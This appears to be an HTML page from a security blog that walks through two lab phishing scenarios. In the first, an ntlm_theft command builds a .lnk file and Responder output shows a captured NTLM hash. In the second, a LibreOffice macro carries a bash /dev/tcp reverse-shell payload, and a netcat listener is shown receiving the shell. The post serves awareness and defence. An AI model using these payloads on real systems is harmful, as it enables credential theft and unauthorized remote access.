@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Bait, Hook, and Hack | SecFortress</title>
+<meta name="keywords" content="">
+<meta name="description" content="Few tactics and techniques behind phishing attacks i have came accrossed in simulated labs xD">
+<meta name="author" content="SecFortress">
+<link rel="canonical" href="http://localhost:1313/hacking/phishing_guide/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fd5566c526ae48aadabd950798a2dc3568536401560eae5caac3765a42a9e7b5.css" integrity="sha256-/VVmxSauSKravZUHmKLcNWhTZAFWDq5cqsN2WkKp57U=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/hacking/phishing_guide/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:url" content="http://localhost:1313/hacking/phishing_guide/">
+  <meta property="og:site_name" content="SecFortress">
+  <meta property="og:title" content="Bait, Hook, and Hack">
+  <meta property="og:description" content="Few tactics and techniques behind phishing attacks i have came accrossed in simulated labs xD">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="hacking">
+    <meta property="article:published_time" content="2024-09-07T07:40:10+01:00">
+    <meta property="article:modified_time" content="2024-09-07T07:40:10+01:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Bait, Hook, and Hack">
+<meta name="twitter:description" content="Few tactics and techniques behind phishing attacks i have came accrossed in simulated labs xD">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Hackings",
+      "item": "http://localhost:1313/hacking/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Bait, Hook, and Hack",
+      "item": "http://localhost:1313/hacking/phishing_guide/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Bait, Hook, and Hack",
+  "name": "Bait, Hook, and Hack",
+  "description": "Few tactics and techniques behind phishing attacks i have came accrossed in simulated labs xD",
+  "keywords": [
+    
+  ],
+  "articleBody": "Phishing is like fishing with a twist—except instead of catching fish, you’re trying to reel in sensitive information. Cybercriminals use cunning tactics to craft emails and websites that look all too real, hoping you’ll bite. In this post, we’re going to break down the phishing process from the initial bait to the final hook. You’ll learn how these attacks are set up, how to spot them, and what you can do to protect yourself.\nIn my simulated lab experiences, I’ve encountered several phishing scenarios that highlight the sophistication of these attacks. From deceptive emails that mimic trusted sources to cleverly disguised phishing websites, these examples offer valuable insights into how attackers operate. Understanding these tactics not only helps in recognizing potential threats but also enhances your ability to defend against them effectively.\nScenario 1 : Linking to Trouble In this scenario, we delve into the art of crafting a seemingly innocent .lnk file, but with a malicious twist. Our approach involves creating a .lnk file designed to exploit vulnerabilities in the Windows environment. We start by creating this file with the following tool called “ntlm_theft” created by Green Wolf.\n############ Command Breakdown ############## # -g: generate all file formats # -s: IP SMB hash capture server (Responder, smbserver.py) # -f: Base filename without extension python3 ntlm_theft.py -g all -s 10.11.69.221 -f secfortress Once this nefarious file is crafted and uploaded to a shared SMB location, it awaits an unsuspecting victim. When the user interacts with the file, it silently triggers a process that captures and returns their NTLM hash. Before deploying our malicious .lnk file, it’s crucial to ensure that we have the necessary write access to an SMB share, or an alternative method for file transfer such as FTP or IMAP.\nAs demonstrated, ensuring that a user (with malicious intent) has write access to an SMB share is crucial for delivering a valid payload. This access allows the attacker to upload the malicious .lnk file to the share. However, this scenario isn’t always straightforward. In some trusted environments, users may be granted extensive privileges, including the ability to upload files to areas that are implicitly trusted. Consequently, files uploaded to these locations are often accepted without scrutiny, making them prime targets for exploitation. This highlights the importance of monitoring and restricting file uploads in trusted areas to mitigate potential risks.\nWe can then intercept this valuable hash, opening the door to further exploitation. This technique highlights the power of seemingly benign files and the critical importance of vigilance against such subtle threats. By understanding and simulating these attacks, you gain insight into the sophisticated methods attackers use to compromise systems and the steps you can take to defend against them.\n❯ sudo responder -I tun0 __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR \u0026 MDNS Responder 3.1.4.0 To support this project: Github -\u003e https://github.com/sponsors/lgandx Paypal -\u003e https://paypal.me/PythonResponder Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C [+] Poisoners: LLMNR [ON] NBT-NS [ON] MDNS [ON] DNS [ON] --SNIP-- [+] Listening for events... [SMB] NTLMv2-SSP Client : 192.168.165.30 [SMB] NTLMv2-SSP Username : REDACTED\\Tracy.White [SMB] NTLMv2-SSP Hash : Tracy.White::REDACTED:9bbf8934331a4560:7E3E7EB81FF46C2022052D262FF86FED:0101000000000000804E1194E3EEDA012C0D0C83CBDD665900000000020008004F0031003400450001001E00570 049004E002D004300420041003200580050004B00420052005500300004003400570049004E002D004300420041003200580050004B0042005200550030002E004F003100340045002E004C004F00430041004C00030014004F00310034004 5002E004C004F00430041004C00050014004F003100340045002E004C004F00430041004C0007000800804E1194E3EEDA0106000400020000000800300030000000000000000100000000200000452F70F2B66A34630BD52340E899C3B9A07 2F2D5A53D205FCBB235EA806B7FB60A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200330035000000000000000000 [*] Skipping previously captured hash for REDACTED\\Tracy.White Scenario 2 : Macro Mayhem We’ve seen a surge in VBS macro-based attacks recently, such as CVE-2023-23399 and CVE-2023-28311, which have exploited vulnerabilities in common office software. In this section, we’ll provide a quick guide on how to manually generate similar malicious macros. From embedding them into documents using tools like LibreOffice or Microsoft Excel, to executing them on a target system for a potential reverse shell.\nBelow is a short example of crafting a malicious macro in LibreOffice, designed to open a reverse shell to a remote attacker:\nBreaking Down the Macro\nREM ***** BASIC *****: This line denotes the beginning of a macro script written in LibreOffice BASIC, which is a scripting language similar to Visual Basic for Applications (VBA).\nSub Main: Defines the start of the macro subroutine named “Main.” This is where the script begins execution when triggered.\nshell(...): This command executes a shell command on the target system. Here, it uses the bash shell to initiate a reverse shell connection.\nbash -c 'bash -i \u003e\u0026 /dev/tcp/192.168.0.158/4444 0\u003e\u00261': This is the core payload. It runs a bash command that creates an interactive reverse shell, sending input and output to the attacker’s IP (192.168.0.158) over TCP port 4444. When executed, it effectively gives the attacker remote control of the target system.\nEnd Sub: Marks the end of the macro subroutine.\nGetting a reverse shell is as simple as sending the malicious .odt file to your unsuspecting colleague who “clicks everything,” and waiting for them to open it. Once they do, the reverse shell pops on the attacker’s listener, as long as the target uses Bash or any Linux OS.\nBy embedding this macro into a document and enticing the target to enable macros upon opening, the attacker can establish a reverse shell, gaining unauthorized access to the target system. This example highlights how easy it is to weaponize common office documents, and it underscores the importance of exercising caution with any files that prompt you to enable macros.\n❯ nc -lvnp 4444 Listening on 0.0.0.0 4444 Connection received on 192.168.0.158 33474 bash: cannot set terminal process group (1654): Inappropriate ioctl for device bash: no job control in this shell sec-fortress@Pwn-F0rk-3X3C:~$ whoami whoami sec-fortress Closing the Net! As we close the chapter on phishing, remember that staying one step ahead of cyber criminals is key. From sneaky .lnk files to crafty macros, these attacks exploit human trust and technical vulnerabilities. By understanding these methods, you can better protect yourself and your organization. Always be cautious with unexpected files and links, and never hesitate to verify their legitimacy. With awareness and vigilance, you can turn the tables on these digital predators and keep your information secure. Stay alert, stay informed, and keep phishing at bay!\nTake note that this is based on my experiences in simulated labs, and there are many more phishing techniques out there. The landscape of phishing is constantly evolving, so staying updated and informed is crucial.\nResources Phishing methodology ",
+  "wordCount" : "1036",
+  "inLanguage": "en",
+  "datePublished": "2024-09-07T07:40:10+01:00",
+  "dateModified": "2024-09-07T07:40:10+01:00",
+  "author":{
+    "@type": "Person",
+    "name": "SecFortress"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/hacking/phishing_guide/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "SecFortress",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="SecFortress (Alt + H)">
+                <img src="http://localhost:1313/images/avatar.jpeg" alt="" aria-label="logo"
+                    height="25">SecFortress</a>
+            <div class="logo-switches">
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/hacking" title="🥷 Hacking">
+                    <span>🥷 Hacking</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://sec-fortress.github.io/" title="✍️ Notes">
+                    <span>✍️ Notes</span>&nbsp;
+                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
+                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
+                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
+                        <path d="M15 3h6v6"></path>
+                        <path d="M10 14L21 3"></path>
+                    </svg>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/whoami" title="🇳🇬 Whoami">
+                    <span>🇳🇬 Whoami</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/hacking/">Hackings</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Bait, Hook, and Hack
+    </h1>
+    <div class="post-description">
+      Few tactics and techniques behind phishing attacks i have came accrossed in simulated labs xD
+    </div>
+    <div class="post-meta"><span title='2024-09-07 07:40:10 +0100 WAT'>September 7, 2024</span>&nbsp;·&nbsp;<span>5 min</span>&nbsp;·&nbsp;<span>SecFortress</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#scenario-1--linking-to-trouble"><strong>Scenario 1 : Linking to Trouble</strong></a></li>
+    <li><a href="#scenario-2--macro-mayhem"><strong>Scenario 2 : Macro Mayhem</strong></a></li>
+    <li><a href="#closing-the-net"><strong>Closing the Net!</strong></a></li>
+    <li><a href="#resources"><strong>Resources</strong></a></li>
+  </ul>
+</nav>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p>Phishing is like fishing with a twist—except instead of catching fish, you&rsquo;re trying to reel in sensitive information. Cybercriminals use cunning tactics to craft emails and websites that look all too real, hoping you&rsquo;ll bite. In this post, we&rsquo;re going to break down the phishing process from the initial bait to the final hook. You&rsquo;ll learn how these attacks are set up, how to spot them, and what you can do to protect yourself.</p>
+<p><img loading="lazy" src="https://i.pinimg.com/originals/69/d8/57/69d857971d2740bad7ba184aa1ffc52e.gif#center"></p>
+<p>In my simulated lab experiences, I’ve encountered several phishing scenarios that highlight the sophistication of these attacks. From deceptive emails that mimic trusted sources to cleverly disguised phishing websites, these examples offer valuable insights into how attackers operate. Understanding these tactics not only helps in recognizing potential threats but also enhances your ability to defend against them effectively.</p>
+<h2 id="scenario-1--linking-to-trouble"><strong>Scenario 1 : Linking to Trouble</strong><a hidden class="anchor" aria-hidden="true" href="#scenario-1--linking-to-trouble">#</a></h2>
+<p>In this scenario, we delve into the art of crafting a seemingly innocent <code>.lnk</code> file, but with a malicious twist. Our approach involves creating a <code>.lnk</code> file designed to exploit vulnerabilities in the Windows environment. We start by creating this file with the following tool called &ldquo;<a href="https://github.com/Greenwolf/ntlm_theft.git"><code>ntlm_theft</code></a>&rdquo; created by <em><strong>Green Wolf</strong></em>.</p>
+<p><img loading="lazy" src="https://i.imgur.com/NhM27Ou.png"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">############ Command Breakdown ##############</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -g: generate all file formats</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -s: IP SMB hash capture server (Responder, smbserver.py)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -f: Base filename without extension</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">python3 ntlm_theft.py -g all -s 10.11.69.221 -f secfortress
+</span></span></code></pre></div><p>Once this nefarious file is crafted and uploaded to a shared SMB location, it awaits an unsuspecting victim. When the user interacts with the file, it silently triggers a process that captures and returns their NTLM hash. Before deploying our malicious <code>.lnk</code> file, it’s crucial to ensure that we have the necessary write access to an SMB share, or an alternative method for file transfer such as <code>FTP</code> or <code>IMAP</code>.</p>
+<p><img loading="lazy" src="https://i.imgur.com/TsEKR40.png"></p>
+<blockquote>
+<p>As demonstrated, ensuring that a user (with malicious intent) has write access to an SMB share is crucial for delivering a valid payload. This access allows the attacker to upload the malicious <code>.lnk</code> file to the share. However, this scenario isn&rsquo;t always straightforward. In some trusted environments, users may be granted extensive privileges, including the ability to upload files to areas that are implicitly trusted. Consequently, files uploaded to these locations are often accepted without scrutiny, making them prime targets for exploitation. This highlights the importance of monitoring and restricting file uploads in trusted areas to mitigate potential risks.</p>
+</blockquote>
+<p><img loading="lazy" src="https://i.imgur.com/lDlpwrP.png#center"></p>
+<p>We can then intercept this valuable hash, opening the door to further exploitation. This technique highlights the power of seemingly benign files and the critical importance of vigilance against such subtle threats. By understanding and simulating these attacks, you gain insight into the sophisticated methods attackers use to compromise systems and the steps you can take to defend against them.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo responder -I tun0
+</span></span><span class="line"><span class="cl">                                         __
+</span></span><span class="line"><span class="cl">  .----.-----.-----.-----.-----.-----.--<span class="p">|</span>  <span class="p">|</span>.-----.----.
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>   _<span class="p">|</span>  -__<span class="p">|</span>__ --<span class="p">|</span>  _  <span class="p">|</span>  _  <span class="p">|</span>     <span class="p">|</span>  _  <span class="o">||</span>  -__<span class="p">|</span>   _<span class="p">|</span>
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="p">|</span>_____<span class="p">|</span>   __<span class="p">|</span>_____<span class="p">|</span>__<span class="p">|</span>__<span class="p">|</span>_____<span class="o">||</span>_____<span class="p">|</span>__<span class="p">|</span>
+</span></span><span class="line"><span class="cl">                   <span class="p">|</span>__<span class="p">|</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">           NBT-NS, LLMNR <span class="p">&amp;</span> MDNS Responder 3.1.4.0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  To support this project:
+</span></span><span class="line"><span class="cl">  Github -&gt; https://github.com/sponsors/lgandx
+</span></span><span class="line"><span class="cl">  Paypal  -&gt; https://paypal.me/PythonResponder
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  To <span class="nb">kill</span> this script hit CTRL-C
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Poisoners:
+</span></span><span class="line"><span class="cl">    LLMNR                      <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    NBT-NS                     <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    MDNS                       <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    DNS                        <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--SNIP--
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> events...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Client   : 192.168.165.30
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Username : REDACTED<span class="se">\T</span>racy.White
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Hash     : Tracy.White::REDACTED:9bbf8934331a4560:7E3E7EB81FF46C2022052D262FF86FED:0101000000000000804E1194E3EEDA012C0D0C83CBDD665900000000020008004F0031003400450001001E00570
+</span></span><span class="line"><span class="cl">049004E002D004300420041003200580050004B00420052005500300004003400570049004E002D004300420041003200580050004B0042005200550030002E004F003100340045002E004C004F00430041004C00030014004F00310034004
+</span></span><span class="line"><span class="cl">5002E004C004F00430041004C00050014004F003100340045002E004C004F00430041004C0007000800804E1194E3EEDA0106000400020000000800300030000000000000000100000000200000452F70F2B66A34630BD52340E899C3B9A07
+</span></span><span class="line"><span class="cl">2F2D5A53D205FCBB235EA806B7FB60A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200330035000000000000000000
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Skipping previously captured <span class="nb">hash</span> <span class="k">for</span> REDACTED<span class="se">\T</span>racy.White
+</span></span></code></pre></div><h2 id="scenario-2--macro-mayhem"><strong>Scenario 2 : Macro Mayhem</strong><a hidden class="anchor" aria-hidden="true" href="#scenario-2--macro-mayhem">#</a></h2>
+<p>We’ve seen a surge in <code>VBS</code> macro-based attacks recently, such as <strong>CVE-2023-23399</strong> and <strong>CVE-2023-28311</strong>, which have exploited vulnerabilities in common office software. In this section, we&rsquo;ll provide a quick guide on how to manually generate similar malicious macros. From embedding them into documents using tools like LibreOffice or Microsoft Excel, to executing them on a target system for a potential reverse shell.</p>
+<p>Below is a short example of crafting a malicious macro in LibreOffice, designed to open a reverse shell to a remote attacker:</p>
+
+
+
+<iframe src="https://drive.google.com/file/d/1eht1kZT8IVZF5-2AWZnSfPAz2EACGEJq/preview"
+    width="640%"
+    height="480"
+    frameborder="0"
+    allow="fullscreen"
+    allow="autoplay"></iframe>
+
+
+<p><strong>Breaking Down the Macro</strong></p>
+<ul>
+<li>
+<p><strong><code>REM ***** BASIC *****</code></strong>: This line denotes the beginning of a macro script written in LibreOffice BASIC, which is a scripting language similar to Visual Basic for Applications (VBA).</p>
+</li>
+<li>
+<p><strong><code>Sub Main</code></strong>: Defines the start of the macro subroutine named &ldquo;Main.&rdquo; This is where the script begins execution when triggered.</p>
+</li>
+<li>
+<p><strong><code>shell(...)</code></strong>: This command executes a shell command on the target system. Here, it uses the <code>bash</code> shell to initiate a reverse shell connection.</p>
+</li>
+<li>
+<p><strong><code>bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.0.158/4444 0&gt;&amp;1'</code></strong>: This is the core payload. It runs a bash command that creates an interactive reverse shell, sending input and output to the attacker&rsquo;s IP (<code>192.168.0.158</code>) over TCP port <code>4444</code>. When executed, it effectively gives the attacker remote control of the target system.</p>
+</li>
+<li>
+<p><strong><code>End Sub</code></strong>: Marks the end of the macro subroutine.</p>
+</li>
+</ul>
+<p>Getting a reverse shell is as simple as sending the malicious <code>.odt</code> file to your unsuspecting colleague who &ldquo;clicks everything,&rdquo; and waiting for them to open it. Once they do, the reverse shell pops on the attacker&rsquo;s listener, as long as the target uses Bash or any Linux OS.</p>
+<p><img loading="lazy" src="https://i.imgur.com/6oBaIwd.png#center"></p>
+<p>By embedding this macro into a document and enticing the target to enable macros upon opening, the attacker can establish a reverse shell, gaining unauthorized access to the target system. This example highlights how easy it is to weaponize common office documents, and it underscores the importance of exercising caution with any files that prompt you to enable macros.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nc -lvnp <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">Listening on 0.0.0.0 <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">Connection received on 192.168.0.158 <span class="m">33474</span>
+</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1654<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+</span></span><span class="line"><span class="cl">bash: no job control in this shell
+</span></span><span class="line"><span class="cl">sec-fortress@Pwn-F0rk-3X3C:~$ whoami
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">sec-fortress
+</span></span></code></pre></div><h2 id="closing-the-net"><strong>Closing the Net!</strong><a hidden class="anchor" aria-hidden="true" href="#closing-the-net">#</a></h2>
+<p><img loading="lazy" src="https://i.pinimg.com/originals/fb/7d/81/fb7d811ce69c58730714a38ede4d4d3e.gif#center"></p>
+<p>As we close the chapter on phishing, remember that staying one step ahead of cyber criminals is key. From sneaky <code>.lnk</code> files to crafty macros, these attacks exploit human trust and technical vulnerabilities. By understanding these methods, you can better protect yourself and your organization. Always be cautious with unexpected files and links, and never hesitate to verify their legitimacy. With awareness and vigilance, you can turn the tables on these digital predators and keep your information secure. Stay alert, stay informed, and keep phishing at bay!</p>
+<p><strong>Take note that this is based on my experiences in simulated labs, and there are many more phishing techniques out there. The landscape of phishing is constantly evolving, so staying updated and informed is crucial.</strong></p>
+<h2 id="resources"><strong>Resources</strong><a hidden class="anchor" aria-hidden="true" href="#resources">#</a></h2>
+<ul>
+<li><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/phishing-methodology">Phishing methodology</a></li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/hacking/the_unseen_struggles/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Where I&#39;ve Been, Isn&#39;t Where I Am Going</span>
+  </a>
+  <a class="next" href="http://localhost:1313/hacking/from_proof.txt_to_paychecksday_one/">
+    <span class="title">Next »</span>
+    <br>
+    <span>From Proof.txt to Paychecks — Day One</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">SecFortress</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
